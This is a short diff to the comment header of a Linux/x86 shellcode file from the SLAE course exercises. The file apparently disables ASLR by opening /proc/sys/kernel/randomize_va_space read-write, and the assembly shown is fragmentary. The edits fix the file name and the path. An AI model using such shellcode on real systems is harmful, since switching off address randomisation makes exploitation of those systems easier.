@@ -1,6 +1,6 @@
 /*
  Linux/x86
- setuid-disable-aslr.c by @abatchy17 - abatchy.com
+ setruid-disable-aslr.c by @abatchy17 - abatchy.com
  Shellcode size: 80 bytes
  SLAE-885
  
@@ -19,7 +19,7 @@
  int    0x80
  
  ;
- ; open("/proc/sys/kernel/randomize_va_spaceX", O_RDWR)
+ ; open("/proc/sys/kernel/randomize_va_space", O_RDWR)
  ;
  xor eax,eax     ; EAX = 0
  jmp aslr_file
@@ -50,7 +50,7 @@
  int 80h         ; Yep, that's it
  
  aslr_file:
- call shellcode  ; Skips the filename and avoids using JMP
+ call shellcode  ;
  db '/proc/sys/kernel/randomize_va_space'
 */
 
